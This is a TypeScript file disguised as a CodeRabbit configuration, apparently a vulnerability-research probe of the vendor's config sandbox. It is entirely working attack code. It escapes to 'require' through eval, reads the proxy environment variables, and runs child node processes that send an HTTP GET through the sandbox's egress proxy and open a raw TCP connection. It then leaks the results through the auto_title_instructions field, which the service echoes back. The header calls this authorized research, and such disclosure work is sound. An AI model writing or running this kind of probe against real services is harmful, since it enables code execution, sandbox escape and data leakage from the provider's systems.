// CodeRabbit config-execution probe CR-P3-121-PROXY (authorized VDP research).
// The sandbox advertises HTTP(S)_PROXY=http://127.0.0.1:1080. Probe 112 showed `fetch` does
// not egress. This probe tests whether the VENDOR'S OWN PROXY is reachable and usable from
// repository-supplied code, because a reusable proxy would be a materially different finding
// from a stubbed fetch. ONE benign HTTP GET, issued to the target's own host (app.coderabbit.ai,
// in scope) with an absolute URI, which is what an HTTP proxy expects. No third party is
// contacted. Nothing is written, deleted or modified.

const MARK = "CR-P3-121-PROXY"
const R: string[] = []

function clip(v: any, n: number): string {
  let s: string
  try {
    s = typeof v === "string" ? v : String(v)
  } catch (_) {
    s = "?"
  }
  s = s.replace(/[^\x20-\x7e]/g, " ")
  return s.length > n ? s.slice(0, n) : s
}

function rec(t: string, v: any): void {
  try {
    R.push(t + "=" + clip(v, 700))
  } catch (_) {
    /* ignore */
  }
}

function safe(t: string, f: () => any): any {
  try {
    const v = f()
    rec(t, v)
    return v
  } catch (e: any) {
    rec(t + "!x", clip(e && (e.code || e.name || e.message) ? String(e.code || e.name || e.message) : "ERR", 120))
    return undefined
  }
}

// A child node process is used so the request can be issued SYNCHRONOUSLY and therefore land in
// the resolved-configuration dump that CodeRabbit echoes back as the oracle.
const CHILD = [
  'const h = require("node:http")',
  'let done = false',
  'function fin(s) { if (!done) { done = true; console.log(s); process.exit(0) } }',
  'const rq = h.get({ host: "127.0.0.1", port: 1080, path: "http://app.coderabbit.ai/", headers: { Host: "app.coderabbit.ai", Connection: "close" }, timeout: 4000 }, (res) => {',
  '  let d = ""',
  '  res.on("data", (c) => { d += c; if (d.length > 200) fin("STATUS " + res.statusCode + " HDRS " + JSON.stringify(res.headers).slice(0, 200) + " BODY " + JSON.stringify(d.slice(0, 200))) })',
  '  res.on("end", () => fin("STATUS " + res.statusCode + " HDRS " + JSON.stringify(res.headers).slice(0, 200) + " BODY " + JSON.stringify(d.slice(0, 200))))',
  '  res.on("error", (e) => fin("RESP_ERR " + (e.code || e.message)))',
  '})',
  'rq.on("timeout", () => { try { rq.destroy() } catch (e) {} fin("TIMEOUT_no_response") })',
  'rq.on("error", (e) => fin("SOCKET_ERR " + (e.code || e.message)))',
  'setTimeout(() => fin("HARDTIMEOUT"), 7000)',
].join("\n")

safe("A.scope_require", () => eval("typeof require"))

const rt = eval("typeof require")
if (rt === "function") {
  safe("B.http_module", () => { const h: any = eval("require")("node:http"); return "ok agent=" + typeof h.request })
  safe("B.net_module", () => { const n: any = eval("require")("node:net"); return "ok connect=" + typeof n.connect + " Socket=" + typeof n.Socket })
  safe("B.dns_module", () => { const d: any = eval("require")("node:dns"); return "ok lookup=" + typeof d.lookup })
  safe("B.env_proxy", () => { const p: any = (globalThis as any).process; return "HTTP_PROXY=" + p.env.HTTP_PROXY + " HTTPS_PROXY=" + p.env.HTTPS_PROXY + " NO_PROXY=" + p.env.NO_PROXY + " no_proxy=" + p.env.no_proxy })

  // --- THE single probe: one GET through the sandbox's own egress proxy ---------
  safe("C.PROXY_GET", () => {
    const cp: any = eval("require")("node:child_process")
    const ef: any = cp.execFileSync
    if (typeof ef !== "function") return "NO_execFileSync"
    const out: any = ef((globalThis as any).process.execPath, ["-e", CHILD], { timeout: 12000, encoding: "utf8", stdio: ["ignore", "pipe", "pipe"] })
    return "out=" + out
  })

  // A pure TCP connect (no bytes sent) distinguishes "nothing listening" from "reachable but
  // policy-refused". No HTTP request is issued.
  safe("D.TCP_CONNECT_ONLY", () => {
    const n: any = eval("require")("node:net")
    const cp: any = eval("require")("node:child_process")
    const S = [
      'const n = require("node:net")',
      'const s = n.connect(1080, "127.0.0.1")',
      'function fin(x) { console.log(x); process.exit(0) }',
      's.on("connect", () => fin("TCP_CONNECTED_then_closed"))',
      's.on("error", (e) => fin("TCP_ERR " + (e.code || e.message)))',
      'setTimeout(() => fin("TCP_TIMEOUT"), 4000)',
    ].join("\n")
    return "out=" + cp.execFileSync((globalThis as any).process.execPath, ["-e", S], { timeout: 9000, encoding: "utf8" })
  })
} else {
  rec("C.PROXY_GET", "SKIPPED_no_require")
}

export default {
  reviews: {
    profile: "chill",
    auto_title_instructions: MARK + " :: " + R.join(" || "),
  },
}
